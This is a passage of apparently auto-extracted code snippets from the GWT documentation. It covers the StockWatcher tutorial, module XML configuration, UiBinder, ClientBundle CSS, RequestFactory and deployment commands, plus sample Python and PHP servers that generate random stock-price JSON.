https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\nprivate void displayError(String error) {\n  errorMsgLabel.setText(\"Error: \" + error);\n  errorMsgLabel.setVisible(true);\n}\n```\n\n----------------------------------------\n\nTITLE: Using DateTimeFormat in GWT\nDESCRIPTION: Shows the import statement for DateTimeFormat in GWT, which provides a subset of functionality similar to java.util.DateTimeFormat for date and number formatting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsCompatibility.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nimport com.google.gwt.i18n.client.DateTimeFormat;\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Type Mismatch in JSNI Method with Error Handling\nDESCRIPTION: This example shows an incorrect JSNI implementation that returns a string when the method signature expects an integer. It includes error handling to catch the exception thrown in development mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic static native int badExample() /*-{\n  return \"Not A Number\";\n}-*/;\n\npublic void onClick() {\n  try {\n    int myValue = badExample();\n    GWT.log(\"Got value \" + myValue, null);\n  } catch (Exception e) {\n    GWT.log(\"JSNI method badExample() threw an exception:\", e);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Instantiating ClientFactory with GWT.create for Deferred Binding\nDESCRIPTION: Code showing how to instantiate a ClientFactory using GWT.create for deferred binding, allowing different implementations to be selected at compile time based on properties.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nClientFactory clientFactory = GWT.create(ClientFactory.class);\n```\n\n----------------------------------------\n\nTITLE: Creating a Stub for refreshWatchList Method in GWT\nDESCRIPTION: Defines a stub for the refreshWatchList method which will be implemented to update stock prices and change values for all tracked stocks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\nprivate void refreshWatchList() {\n    // TODO Auto-generated method stub\n}\n```\n\n----------------------------------------\n\nTITLE: Compiling GWT Application for Deployment\nDESCRIPTION: Shell command to compile a GWT application using Ant build script, typically used before deploying to environments like Google App Engine.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideDeploying.md#2025-04-09_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nant build\n```\n\n----------------------------------------\n\nTITLE: StackPanel Inside StackPanel CSS Example\nDESCRIPTION: Shows a practical example of styling a StackPanel inside another StackPanel using imported scopes with prefixes, demonstrating how to handle nested components of the same type.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_37\n\nLANGUAGE: java\nCODE:\n```\n// Assume this interface is provided by the UI library\ninterface StackPanelCss extends CssResource {\n  String widget();\n  // and many more class names\n}\n\n// App code defines the following interfaces:\n\n@ImportedWithPrefix(\"inner\")\ninterface StackPanelInner extends StackPanelCss {\n  // Empty interface\n}\n\ninterface StackPanelOuter extends StackPanelCss {\n  // Empty interface\n}\n\ninterface Resources {\n  @Source(\"stackPanel.css\")\n  StackPanelInner inner();\n\n  @Import(StackPanelInner.class)\n  @Source(\"stackPanel.css\", \"outer.css\")\n  StackPanelOuter outer();\n}\n```\n\nLANGUAGE: css\nCODE:\n```\n.widget .title {}\n.widget .content {}\n/* Other stuff to make a StackPanel work */\n```\n\nLANGUAGE: css\nCODE:\n```\n.widget {color: red;}\n\n.inner-widget {\n  color: blue;\n  font-size: smaller;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Cursor Focus to Input Box in GWT StockWatcher Application\nDESCRIPTION: This code expands the StockWatcher implementation to add cursor focus to the input text box when the application loads. It includes all the previous UI setup code plus the additional functionality to set focus on the newSymbolTextBox.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.HorizontalPanel;\nimport com.google.gwt.user.client.ui.Label;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\n\npublic class StockWatcher implements EntryPoint {\n\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n\n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n\n    // Assemble Add Stock panel.\n    addPanel.add(newSymbolTextBox);\n    addPanel.add(addStockButton);\n\n    // Assemble Main panel.\n    mainPanel.add(stocksFlexTable);\n    mainPanel.add(addPanel);\n    mainPanel.add(lastUpdatedLabel);\n\n    // Associate the Main panel with the HTML host page.\n    RootPanel.get(\"stockList\").add(mainPanel);\n\n    // Move cursor focus to the input box.\n    newSymbolTextBox.setFocus(true);\n\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Template Setup\nDESCRIPTION: HTML template configuration with viewport settings and required script imports\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<!doctype html>\n<html>\n<head>\n <meta name=\"viewport\"\n   content=\"user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1\" />\n <script src=\"todolist/bower_components/webcomponentsjs/webcomponents.js\"></script>\n <script type=\"text/javascript\" src=\"todolist/todolist.nocache.js\"></script>\n</head>\n<body>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Adding Timestamp Updates to Stock Table\nDESCRIPTION: Implementation of timestamp functionality to show last update time\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\nprivate void updateTable(StockPrice[] prices) {\n  for (int i = 0; i < prices.length; i++) {\n    updateTable(prices[i]);\n  }\n\n  // Display timestamp showing last refresh.\n  DateTimeFormat dateFormat = DateTimeFormat.getFormat(\n  DateTimeFormat.PredefinedFormat.DATE_TIME_MEDIUM);\n  lastUpdatedLabel.setText(\"Last update : \" \n    + dateFormat.format(new Date()));\n}\n```\n\n----------------------------------------\n\nTITLE: Creating GWT Application with webAppCreator Command\nDESCRIPTION: Command-line instruction for creating a new GWT application named StockWatcher using webAppCreator tool. Includes parameters for output directory, JUnit path, and module name.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/create.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nwebAppCreator -out StockWatcher\n                  -junit \"C:\\eclipse\\plugins\\org.junit_3.8.2.v200706111738\\junit.jar\"\n                  com.google.gwt.sample.stockwatcher.StockWatcher\n```\n\n----------------------------------------\n\nTITLE: Optimized CSS After Selector Merging in GWT\nDESCRIPTION: Shows the result of GWT's selector merging optimization, which combines rules with identical selectors to produce more compact CSS while preserving the original functionality.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_28\n\nLANGUAGE: css\nCODE:\n```\n.div {prop:value;foo:bar;}\n```\n\n----------------------------------------\n\nTITLE: Implementing Account DTO Class in Java\nDESCRIPTION: Basic DTO class for Account entities with serialization support and data fields for ID, name, password, and associated records.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.musicstore.client.dto;\n\nimport java.io.Serializable;\nimport java.util.Set;\n\npublic class AccountDTO implements Serializable {\n  private Long id;\n  private String name;\n  private String password;\n  private Set<RecordDTO> records;\n\n  public AccountDTO() {\n  }\n\n  public AccountDTO(Long id) {\n    this.id = id;\n  }\n\n  public AccountDTO(Long id, String name, String password,\n      Set<RecordDTO> records) {\n    this.id = id;\n    this.name = name;\n    this.password = password;\n    this.records = records;\n  }\n\n  // Along with corresponding getters + setters.\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing EntityProxy stableId Method with Category in GWT\nDESCRIPTION: Shows how to implement the stableId() method for EntityProxy using a category in RequestFactory. This example demonstrates accessing AutoBean tags.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nclass EntityProxyCategory {\n  EntityProxyId<?> stableId(AutoBean<EntityProxy> instance) {\n    return (EntityProxyId<?>) instance.getTag(\"stableId\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Instrumenting a Java Method with Custom Metrics\nDESCRIPTION: Example of instrumenting a Java method (createWidget) with custom performance metrics using the StatsEventLogger utility to track start and end times of the loadListings operation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLightweightMetrics.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic FlexTable createWidget() {\n  FlexTable listings = new FlexTable();\n  double startTime = Duration.currentTimeMillis();\n  StatsEventLogger.logEvent(GWT.getModuleName(), \"listings\", \"loadListings\", startTime, \"begin\");\n  loadListings(listings, range);\n  double endTime = Duration.currentTimeMillis();\n  StatsEventLogger.logEvent(GWT.getModuleName(), \"listings\", \"loadListings\", endTime, \"end\");\n  return listings;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding KeyDownHandler for Input Box in GWT StockWatcher\nDESCRIPTION: Implementation of a KeyDownHandler for the input textbox to detect when the user presses the Enter key. This handler calls the same addStock() method as the click handler, allowing users to add stocks either by clicking the Add button or pressing Enter.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/manageevents.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n  // Listen for mouse events on the Add button.\n  addStockButton.addClickHandler(new ClickHandler() {\n    public void onClick(ClickEvent event) {\n      addStock();\n    }\n  });\n  \n  // Listen for keyboard events in the input box.\n   newSymbolTextBox.addKeyDownHandler(new KeyDownHandler() {\n    public void onKeyDown(KeyDownEvent event) {\n      if (event.getNativeKeyCode() == KeyCodes.KEY_ENTER) {\n        addStock();\n      }\n    }\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: GWT HTTP Module Integration in XML\nDESCRIPTION: XML configuration to inherit HTTP functionality in the GWT module.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<!-- Other module inherits -->\n<inherits name=\"com.google.gwt.http.HTTP\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Module XML\nDESCRIPTION: The module XML file defines the GWT application structure, including inherited modules, entry points, and theme settings. It specifies core GWT functionality and application configuration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/create.md#2025-04-09_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<module rename-to='stockwatcher'>\n  <!-- Inherit the core Web Toolkit stuff.                        -->\n  <inherits name='com.google.gwt.user.User'/>\n\n  <!-- Inherit the default GWT style sheet.  You can change       -->\n  <!-- the theme of your GWT application by uncommenting          -->\n  <!-- any one of the following lines.                            -->\n  <inherits name='com.google.gwt.user.theme.standard.Standard'/>\n  <!-- <inherits name=\"com.google.gwt.user.theme.chrome.Chrome\"/> -->\n  <!-- <inherits name=\"com.google.gwt.user.theme.dark.Dark\"/>     -->\n\n  <!-- Other module inherits                                      -->\n\n  <!-- Specify the app entry point class.                         -->\n  <entry-point class='com.google.gwt.sample.stockwatcher.client.StockWatcher'/>\n\n  <!-- Specify the paths for translatable code                    -->\n  <source path='client'/>\n\n</module>\n```\n\n----------------------------------------\n\nTITLE: Error Handling in GWT Application\nDESCRIPTION: Helper method for handling errors and implementing logout functionality when authentication fails.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_30\n\nLANGUAGE: java\nCODE:\n```\nprivate void handleError(Throwable error) {\n    Window.alert(error.getMessage());\n    if (error instanceof NotLoggedInException) {\n      Window.Location.replace(loginInfo.getLogoutUrl());\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: Implementing a Python Server for JSONP Stock Data Simulation\nDESCRIPTION: A Python script that simulates a remote server running on port 8000, generating random stock price data. It supports both JSON and JSONP output formats through the 'callback' query parameter.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/Xsite.md#2025-04-09_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n#!/usr/bin/env python2.4\n#\n# Copyright 2007 Google Inc. All Rights Reserved.\n\nimport BaseHTTPServer\nimport SimpleHTTPServer\nimport urllib\nimport random\n\nMAX_PRICE = 100.0\nMAX_PRICE_CHANGE = 0.02\n\nclass MyHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n\n  def do_GET(self):\n    form = {}\n    if self.path.find('?') > -1:\n      queryStr = self.path.split('?')[1]\n      form = dict([queryParam.split('=') for queryParam in queryStr.split('&amp;')])\n\n      body = '['\n\n      if 'q' in form:\n        quotes = []\n\n        for symbol in urllib.unquote_plus(form['q']).split(' '):\n          price = random.random() * MAX_PRICE\n          change = price * MAX_PRICE_CHANGE * (random.random() * 2.0 - 1.0)\n          quotes.append(('{\"﻿symbol\":\"%s\",\"price\":%f,\"change\":%f}'\n                       % (symbol, price, change)))\n\n        body += ','.join(quotes)\n\n      body += ']'\n\n      if 'callback' in form:\n        body = ('%s(%s);' % (form['callback'], body))\n\n    self.send_response(200)\n    self.send_header('Content-Type', 'text/javascript')\n    self.send_header('Content-Length', len(body))\n    self.send_header('Expires', '-1')\n    self.send_header('Cache-Control', 'no-cache')\n    self.send_header('Pragma', 'no-cache')\n    self.end_headers()\n\n    self.wfile.write(body)\n    self.wfile.flush()\n    self.connection.shutdown(1)\n\nbhs = BaseHTTPServer.HTTPServer(('', 8000), MyHandler)\nbhs.serve_forever()\n```\n\n----------------------------------------\n\nTITLE: Adding Static Image to StockWatcher HTML\nDESCRIPTION: This HTML snippet shows how to add a static image (GWT logo) to the StockWatcher application's host page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n    <link type=\"text/css\" rel=\"stylesheet\" href=\"StockWatcher.css\">\n    <title>StockWatcher</title>\n    <script src=\"stockwatcher/stockwatcher.nocache.js\"></script>\n  </head>\n  <body>\n    <img src=\"images/gwt.png\" />\n    <h1>StockWatcher</h1>\n    <div id=\"stockList\"></div>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: DoubleStream Methods Reference\nDESCRIPTION: Methods available in DoubleStream interface for creating and manipulating streams of double values.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_18\n\nLANGUAGE: java\nCODE:\n```\nbuilder(), concat(DoubleStream, DoubleStream), empty(), generate(DoubleSupplier), \niterate(double, DoubleUnaryOperator), iterate(double, DoublePredicate, DoubleUnaryOperator), \nof(double[]), of(double), allMatch(DoublePredicate), anyMatch(DoublePredicate)\n```\n\n----------------------------------------\n\nTITLE: Creating a GWT Web Application on Mac/Linux\nDESCRIPTION: Commands to navigate to the GWT SDK directory, make the webAppCreator script executable, and create a new web application on Mac or Linux systems.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted.md#2025-04-09_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncd gwt-2.10.0\n\nchmod u+x webAppCreator\n\n./webAppCreator -out MyWebApp com.mycompany.mywebapp.MyWebApp\n```\n\n----------------------------------------\n\nTITLE: Deleting Data from HTML5 Storage in GWT\nDESCRIPTION: Shows how to delete data from HTML5 storage using GWT's Storage API. It includes methods for removing a specific key-value pair or clearing all data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\n// Remove a specific item\nstorage.removeItem(\"key\");\n\n// Clear all items\nstorage.clear();\n```\n\n----------------------------------------\n\nTITLE: GWT Button Creation - Modified\nDESCRIPTION: Java code showing the modified button creation with 'Send to Server' label.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted-v2.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nfinal Button sendButton = new Button(\"Send to Server\");\n```\n\n----------------------------------------\n\nTITLE: Applying Dependent Style to Remove Button in Java\nDESCRIPTION: This Java snippet demonstrates how to apply a dependent style to the Remove button in the StockWatcher application using the addStyleDependentName method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\n// Add a button to remove this stock from the table.\nButton removeStockButton = new Button(\"x\");\nremoveStockButton.addStyleDependentName(\"remove\");\n```\n\n----------------------------------------\n\nTITLE: Rendering HTML for Cells using UiBinder in GWT\nDESCRIPTION: This example shows how to use UiBinder templates to generate HTML for Cell Widgets in GWT. It includes both the XML template and the Java code for the HelloWorldCell.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_32\n\nLANGUAGE: xml\nCODE:\n```\n<!-- HelloWorldCell.ui.xml -->\n\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'>\n  <ui:with field='name' type='java.lang.String'/>\n\n  <div>\n    Hello, <span><ui:text from='{name}'/></span>.\n  </div>\n</ui:UiBinder>\n```\n\nLANGUAGE: java\nCODE:\n```\npublic class HelloWorldCell extends AbstractCell<String> {\n  interface MyUiRenderer extends UiRenderer {\n    void render(SafeHtmlBuilder sb, String name);\n  }\n  private static MyUiRenderer renderer = GWT.create(MyUiRenderer.class);\n\n  @Override\n  public void render(Context context, String value, SafeHtmlBuilder builder) {\n    renderer.render(builder, value);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CSS Constraints for Layout in GWT\nDESCRIPTION: Example CSS showing how constraint-based layout works in GWT 2.0. This demonstrates how a child element can automatically consume its parent's space while maintaining specified margins using CSS position properties.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_6\n\nLANGUAGE: css\nCODE:\n```\n.parent {\n  position: relative; /* to establish positioning context */\n}\n\n.child {\n  position: absolute; left:1em; top:1em; right:1em; bottom:1em;\n}\n```\n\n----------------------------------------\n\nTITLE: Naming RunAsync Calls in GWT Code Splitting\nDESCRIPTION: Shows how to name a runAsync call by adding a class literal as the first argument. This naming enables specifying initial load sequences for optimized code splitting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodeSplitting.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nGWT.runAsync(SomeClass.class, new RunAsyncCallback() {\n    // ... callback class's body ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Hibernate Serialization Exception Example\nDESCRIPTION: Example stack trace showing the SerializationException that occurs when attempting to serialize a Hibernate PersistentSet collection over GWT RPC. This error occurs because GWT's serialization policy cannot handle Hibernate-enhanced objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_10\n\nLANGUAGE: text\nCODE:\n```\nCaused by: com.google.gwt.user.client.rpc.SerializationException: Type 'org.hibernate.collection.PersistentSet' was not included in the set of types which can be serialized by this SerializationPolicy or its Class object could not be loaded. For security purposes, this type will not be serialized.\nat com.google.gwt.user.server.rpc.impl.StandardSerializationPolicy.validateSerialize(StandardSerializationPolicy.java:83)\nat com.google.gwt.user.server.rpc.impl.ServerSerializationStreamWriter.serialize(ServerSerializationStreamWriter.java:591)\n\n```\n\n----------------------------------------\n\nTITLE: LongStream Methods Reference\nDESCRIPTION: Methods available in LongStream interface for creating and manipulating streams of long values.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_20\n\nLANGUAGE: java\nCODE:\n```\nbuilder(), concat(LongStream, LongStream), empty(), generate(LongSupplier), \niterate(long, LongUnaryOperator), iterate(long, LongPredicate, LongUnaryOperator), \nof(long[]), of(long), range(long, long), rangeClosed(long, long)\n```\n\n----------------------------------------\n\nTITLE: GWT XML Configuration for ClientFactory Implementation\nDESCRIPTION: GWT module XML configuration that specifies which implementation class to use for a ClientFactory interface through the replace-with element, enabling deferred binding.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideMvpActivitiesAndPlaces.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<!-- Use ClientFactoryImpl by default -->\n    <replace-with class=\"com.hellomvp.client.ClientFactoryImpl\">\n    <when-type-is class=\"com.hellomvp.client.ClientFactory\"/>\n    </replace-with>\n```\n\n----------------------------------------\n\nTITLE: Cloning GWT Source Repository with Git\nDESCRIPTION: Command to clone the GWT source code repository using Git. This allows developers to check out the latest source code for compilation or contribution.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/makinggwtbetter.md#2025-04-09_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://gwt.googlesource.com/gwt trunk\n```\n\n----------------------------------------\n\nTITLE: Copying GWT Application Files to Web Server\nDESCRIPTION: Example directory structure for deploying the DynaTable GWT application to a web server. Shows the required files and their placement in the server's directory structure.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideDeploying.md#2025-04-09_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nwebapps/dynatable/DynaTable.html\nwebapps/dynatable/DynaTable.css\nwebapps/dynatable/dynatable/dynatable.nocache.js\n// The rest of your GWT application files under webapps/dynatable/dynatable/\n```\n\n----------------------------------------\n\nTITLE: Using JsInterop Export Filters with Command-Line Arguments\nDESCRIPTION: Command-line arguments to control JsInterop export filtering in GWT. This demonstrates the flags for enabling JsInterop exports (-generateJsInteropExports) and specifying inclusion/exclusion patterns (-includeJsInteropExports and -excludeJsInteropExports) with wildcard support.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\n-generateJsInteropExports -includeJsInteropExports -excludeJsInteropExports\n```\n\n----------------------------------------\n\nTITLE: Alternative GWT Create Implementation\nDESCRIPTION: Equivalent implementation using direct GWT.create() call instead of GwtCreateResource.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\nReturnType obj = GWT.<ReturnType> create(SomeClass.class);\n```\n\n----------------------------------------\n\nTITLE: Debugging GWT Installation Problems in Development Mode\nDESCRIPTION: Error stack trace showing a RuntimeException that occurs when GWT cannot determine its installation directory. This typically happens when the runtime binary installation path cannot be located or the classpath doesn't include the proper JAR files.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_9\n\nLANGUAGE: text\nCODE:\n```\nException in thread \"main\" java.lang.ExceptionInInitializerError\nCaused by: java.lang.RuntimeException: Installation problem detected, please reinstall GWT\n    at com.google.gwt.util.tools.Utility.computeInstallationPath(Utility.java:322)\n    at com.google.gwt.util.tools.Utility.getInstallPath(Utility.java:223)\n    at com.google.gwt.util.tools.ToolBase.<clinit>(ToolBase.java:55)\nCaused by: java.io.IOException: Cannot determine installation directory; apparently not running from a jar\n    at com.google.gwt.util.tools.Utility.computeInstallationPath(Utility.java:307)\n  ...\n```\n\n----------------------------------------\n\nTITLE: French Plural Forms in Properties File (Properties)\nDESCRIPTION: Example of defining plural forms for French in a properties file. It shows how to handle singular and plural cases for item counts in a shopping cart.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nPluralForms.md#2025-04-09_snippet_1\n\nLANGUAGE: properties\nCODE:\n```\ncartItems=There are {0,number} items in your cart.\ncartItems[one]=There is {0,number} item in your cart.\n```\n\n----------------------------------------\n\nTITLE: Creating a PHP Script for JSON Stock Data Generation\nDESCRIPTION: This PHP script generates random stock price data in JSON format based on stock symbols provided in the query parameter. It includes headers for proper content type and caching control, and calculates random prices and changes for requested stock symbols.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSONphp.md#2025-04-09_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n  header('Content-Type: text/javascript');\n  header('Cache-Control: no-cache');\n  header('Pragma: no-cache');\n\n  define(\"MAX_PRICE\", 100.0); // $100.00\n  define(\"MAX_PRICE_CHANGE\", 0.02); // +/- 2%\n\n  echo '[';\n\n  $q = trim($_GET['q']);\n  if ($q) {\n    $symbols = explode(' ', $q);\n\n    for ($i=0; $i<count($symbols); $i++) {\n      $price = lcg_value() * MAX_PRICE;\n      $change = $price * MAX_PRICE_CHANGE * (lcg_value() * 2.0 - 1.0);\n\n      echo '{';\n      echo \"\\\"symbol\\\":\\\"$symbols[$i]\\\",\";\n      echo \"\\\"price\\\":$price,\";\n      echo \"\\\"change\\\":$change\";\n      echo '}';\n\n      if ($i < (count($symbols) - 1)) {\n        echo ',';\n      }\n    }\n  }\n\n  echo ']';\n?>\n```\n\n----------------------------------------\n\nTITLE: Including RequestFactory Module in GWT XML\nDESCRIPTION: This snippet shows how to include the RequestFactory module in a GWT module XML file, which is required to use RequestFactory in a GWT application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\n<inherits name='com.google.web.bindery.requestfactory.RequestFactory' />\n```\n\n----------------------------------------\n\nTITLE: Including I18N Module in GWT Project\nDESCRIPTION: XML configuration to include the internationalization module in a GWT project by adding an inherits line to the module XML file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsFormatting.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.gwt.i18n.I18N\"/>\n```\n\n----------------------------------------\n\nTITLE: Implementing Login Authentication Flow\nDESCRIPTION: Implementation of the login authentication flow including login panel setup and service callback handling.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.user.client.ui.Anchor;\n\n...\n\n  private LoginInfo loginInfo = null;\n  private VerticalPanel loginPanel = new VerticalPanel();\n  private Label loginLabel = new Label(\n      \"Please sign in to your Google Account to access the StockWatcher application.\");\n  private Anchor signInLink = new Anchor(\"Sign In\");\n\n  public void onModuleLoad() {\n    // Check login status using login service.\n    LoginServiceAsync loginService = GWT.create(LoginService.class);\n    loginService.login(GWT.getHostPageBaseURL(), new AsyncCallback<LoginInfo>() {\n      public void onFailure(Throwable error) {\n      }\n\n      public void onSuccess(LoginInfo result) {\n        loginInfo = result;\n        if(loginInfo.isLoggedIn()) {\n          loadStockWatcher();\n        } else {\n          loadLogin();\n        }\n      }\n    });\n  }\n\n  private void loadLogin() {\n    // Assemble login panel.\n    signInLink.setHref(loginInfo.getLoginUrl());\n    loginPanel.add(loginLabel);\n    loginPanel.add(signInLink);\n    RootPanel.get(\"stockList\").add(loginPanel);\n  }\n```\n\n----------------------------------------\n\nTITLE: GWT Version Dependencies Listing in Markdown\nDESCRIPTION: List of updated dependencies for GWT including Eclipse JDT, Guava, HTMLUnit and related Apache components\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n  *   Eclipse JDT 3.4.2_r894\n  *   Guava 10.0.1\n  *   HTMLUnit 2.9\n  *   Apache HTTP Client 4.1.2 (for HTMLUnit)\n  *   Apache Commons Lang 2.6 (for HTMLUnit)\n  *   NekoHTML 1.9.15 (for HTMLUnit)\n```\n\n----------------------------------------\n\nTITLE: Implementing Google AJAX Feed API in 